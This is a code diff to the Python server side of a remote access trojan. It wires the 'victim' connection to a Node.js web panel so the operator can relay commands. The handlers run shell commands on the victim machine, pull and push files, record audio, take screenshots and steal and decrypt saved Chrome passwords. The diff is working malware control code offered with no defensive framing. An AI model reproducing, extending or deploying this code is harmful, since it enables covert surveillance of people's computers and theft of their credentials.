@@ -21,15 +21,25 @@ class Server:
         self.listen_count = listen_count
         self.client_name = client_name
 
-    def startListen(self):
+    def start_server_listen(self):
         self.s = socket.socket()
         self.s.bind((self.ip, self.port))
         self.s.listen(self.listen_count)
         self.server_socket, self.adress = self.s.accept()
 
+    def connect_to_web(self):
+        self.sock = socket.socket()
+        self.sock.bind((self.ip, 8888))
+        self.sock.listen(self.listen_count)
+        self.sock.listen(1)
+        self.web_server_socket, self.web_adress = self.sock.accept()
+
     def runThread(self):
-        self.startListen()
-        self.server()
+        self.start_server_listen()
+        print('connected to victim')
+        self.connect_to_web()
+        print('connected to node.js')
+        self.get_command_from_server()
 
     def get_chrome_datetime(self, chromedate):
         """Return a `datetime.datetime` object from a chrome format datetime
@@ -132,73 +142,80 @@ class Server:
                 f.close()
                 break
 
-    def server(self):
-        print("Connection from: " + str(self.adress))
-
+    def get_command_from_server(self):
         while True:
-            print("test")
-            command = input('Please enter a command to the victim\n')
-            self.server_socket.send(command.encode('utf-8'))
+            command = self.web_server_socket.recv(1024).decode()
+            self.run_command(command)
 
-            # recv file (file name on victim computer)
-            if command.startswith('recv file'):
-                self.receive_file_from_client("")
+    def run_command(self, command):
+        print("test")
+        print(command)
+        data = None
+        self.server_socket.send(command.encode('utf-8'))
 
-            # for sending mcd commands to victim computer
-            elif command.startswith("cmd"):
-                data = self.server_socket.recv(2048)
-                print(data.decode('utf-8', 'ignore'))
+        # recv file (file name on victim computer)
+        if command.startswith('recv file'):
+            self.receive_file_from_client("")
 
-
-            elif command.startswith("get files"):
-                data = self.server_socket.recv(20)
-                try:
-                    data = self.server_socket.recv(int(data.decode()))
-                    print(data.decode())
-                except:
-                    print(data)
+        # for sending mcd commands to victim computer
+        elif command.startswith("cmd"):
+            data = self.server_socket.recv(2048)
+            print(data.decode('utf-8', 'ignore'))
 
 
-            elif command.startswith('download file '):
-                command = command[14:-1] + command[-1]
-                self.send_file_to_client(command)
-
-
-            elif command.startswith('take record '):
-                command = command[12:-1] + command[-1]
-                self.server_socket.sendall(command.encode('utf-8'))
-                path = input("Where do you want save the file on victim computer\n")
-                self.server_socket.sendall(path.encode('utf-8'))
-                self.receive_file_from_client("")
-
-            elif command.startswith("get chrome passwords"):
-                self.receive_file_from_client("ChromeKey")
-                self.receive_file_from_client("ChromeData")
-                self.decode_chrome_passwords()
-
-            elif command.startswith('take screenshot '):
-                self.receive_file_from_client("")
-
-            elif command == 'exit':
-                break
-
-            elif command.startswith('listen'):
-                self.receive_file_from_client("")
-
-            elif command == 'exit':
-                self.server_socket.close()
-                break
-
-            elif command == 'q':
-                print("quitting")
-                self.server_socket.close()
-                return
-
-            else:
-                data = self.server_socket.recv(1024).decode('utf-8')
+        elif command.startswith("get files"):
+            data = self.server_socket.recv(20)
+            try:
+                data = self.server_socket.recv(int(data.decode()))
+                print(data.decode())
+            except:
                 print(data)
 
-        self.server_socket.close()
+
+        elif command.startswith('download file '):
+            command = command[14:-1] + command[-1]
+            self.send_file_to_client(command)
+
+
+        elif command.startswith('take record '):
+            command = command[12:-1] + command[-1]
+            self.server_socket.sendall(command.encode('utf-8'))
+            path = input("Where do you want save the file on victim computer\n")
+            self.server_socket.sendall(path.encode('utf-8'))
+            self.receive_file_from_client("")
+
+        elif command.startswith("get chrome passwords"):
+            self.receive_file_from_client("ChromeKey")
+            self.receive_file_from_client("ChromeData")
+            self.decode_chrome_passwords()
+
+        elif command.startswith('take screenshot '):
+            self.receive_file_from_client("")
+
+        elif command == 'exit':
+            return
+
+        elif command.startswith('listen'):
+            self.receive_file_from_client("")
+
+        elif command == 'exit':
+            self.server_socket.close()
+            pass
+
+        elif command == 'q':
+            print("quitting")
+            self.server_socket.close()
+            quit(1)
+
+        else:
+            data = self.server_socket.recv(1024).decode('utf-8')
+            print(data)
+            self.web_server_socket.send(data.encode())
+            return
+
+        self.web_server_socket.send(data)
+
+    # self.server_socket.close()
 
 
 myServer = Server(7613, '127.0.0.1', 1, 'client1')
